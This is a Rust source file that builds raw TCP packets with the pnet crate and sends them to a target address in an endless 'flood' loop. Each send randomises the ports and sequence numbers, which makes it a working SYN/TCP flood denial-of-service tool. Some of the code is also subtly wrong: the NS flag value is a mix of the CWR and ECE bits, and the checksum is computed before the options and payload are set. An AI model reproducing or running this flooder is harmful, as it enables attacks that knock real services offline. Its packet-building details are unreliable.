extern crate pnet;

use std::{
    net::{IpAddr, Ipv4Addr},
    error::Error,
    time::Duration,
    sync::{Arc},
};

use pnet::transport::{transport_channel, TransportSender};
use pnet::transport::TransportProtocol::Ipv4;
use pnet::transport::TransportChannelType::Layer4;
use pnet::packet::ip::IpNextHeaderProtocols;
use pnet::packet::tcp::{TcpFlags, TcpOption};
use pnet::packet::tcp::MutableTcpPacket;

use crate::{
    utils_random_port,
    utils_random_sequence,
};

const IPV4_HEADER_LEN: usize = 20;
const TCP_HEADER_LEN: usize = 32;
const TCP_PAYLOAD_LEN: usize = 32;

#[derive(Debug, PartialEq, Eq, Hash, Clone, Copy)]
pub enum CustomTcpFlags {
    FIN = 0x0001,
    SYN = 0x0002,
    RST = 0x0004,
    PSH = 0x0008,
    ACK = 0x0010,
    URG = 0x0020,
    CWR = 0x0080,
    ECE = 0x0040,
    NS = 0x0080 as isize | 0x0040 as isize,
}

#[derive(Debug)]
pub struct Packet {
    target: Ipv4Addr,
    payload: String,
    sport: u16,
    dport: u16,
    mss: u16,
    wscale: u8,
    flags: Arc<Vec<CustomTcpFlags>>,
}


impl Packet {
    pub fn new(target: Ipv4Addr, payload: &str, sport: u16, dport: u16, mss: u16, wscale: u8, flags: Arc<Vec<CustomTcpFlags>>) -> Self {
        Self {
            target: target,
            payload: payload.into(),
            sport: sport,
            dport: dport,
            mss: mss,
            wscale: wscale,
            flags: flags,
        }
    }

    pub fn build(&mut self) -> Result<(), Box<dyn Error>> {
        let protocol = Layer4(Ipv4(IpNextHeaderProtocols::Tcp));
    
        let (sender, mut _receiver) = match transport_channel(4096, protocol) {
            Ok((tx, rx)) => (tx, rx),
            Err(e) => panic!("An error occurred when creating the transport channel: {}", e),
        };
    
        let source = Ipv4Addr::new(0, 0, 0, 0);
    
        {
            if self.sport == 0 {
                self.sport = utils_random_port();
            }
    
            let mut packet = [0u8; IPV4_HEADER_LEN + TCP_HEADER_LEN + TCP_PAYLOAD_LEN];
            //let mut tcp_packet = MutableTcpPacket::new(&mut packet[IPV4_HEADER_LEN..]).unwrap();
            let mut tcp_packet = MutableTcpPacket::new(&mut packet[..]).unwrap();
            tcp_packet.set_destination(self.dport);
            tcp_packet.set_source(self.sport);
            /*tcp_packet.set_sequence(generate_random_sequence_number());
            tcp_packet.set_acknowledgement(generate_random_sequence_number());*/
    
            if !self.flags.is_empty() {
                let mut tcp_flags: u16 = 0;
                for flag in &mut self.flags.iter() {
                    tcp_flags |= flag.to_owned() as u16;
                }
                tcp_packet.set_flags(tcp_flags);
            } else {
                let tcp_flags = TcpFlags::SYN;
                tcp_packet.set_flags(tcp_flags);
            }
     
            tcp_packet.set_window(64240);
            tcp_packet.set_data_offset(8);
    
            let checksum = pnet::packet::tcp::ipv4_checksum(&tcp_packet.to_immutable(), &source, &self.target);
            tcp_packet.set_checksum(checksum);
    
            let options = vec![
                TcpOption::mss(self.mss),
                TcpOption::wscale(self.wscale),
                TcpOption::sack_perm(),
                TcpOption::nop(),
            ];
            tcp_packet.set_options(&options);
            tcp_packet.set_payload(self.payload.as_bytes());

            /*let mut new_packet = [0u8; 10 + 10];

            let mut ip_packet = pnet::packet::ipv4::MutableIpv4Packet::owned(vec![0u8; 60]).unwrap();
            ip_packet.set_version(4);
            ip_packet.set_header_length(5);
            ip_packet.set_total_length((ip_packet.packet_size() + tcp_packet.packet_size() + 20) as u16);
            ip_packet.set_ttl(64);
            ip_packet.set_next_level_protocol(IpNextHeaderProtocols::Tcp);
            ip_packet.set_source(self.target);
            ip_packet.set_destination(self.target);
            ip_packet.set_payload(tcp_packet.packet_mut());*/
            //sender.send_to(tcp_packet, IpAddr::V4(self.target)).unwrap();
            self.flood(tcp_packet, sender)?;
        }   
        Ok(())
    }

    pub fn flood(&mut self, mut packet: MutableTcpPacket, mut sender: TransportSender) -> Result<(), Box<dyn Error>> {
        loop {
            if self.dport == 0 {
                self.dport = utils_random_port();
            }
            if self.sport == 0 {
                self.sport = utils_random_port();
            }
            packet.set_destination(self.dport);
            packet.set_source(self.sport);
            packet.set_sequence(utils_random_sequence());
            packet.set_acknowledgement(utils_random_sequence());
            sender.send_to(packet.to_immutable(), IpAddr::V4(self.target))?;
            std::thread::sleep(Duration::from_millis(2));
        }
    }
}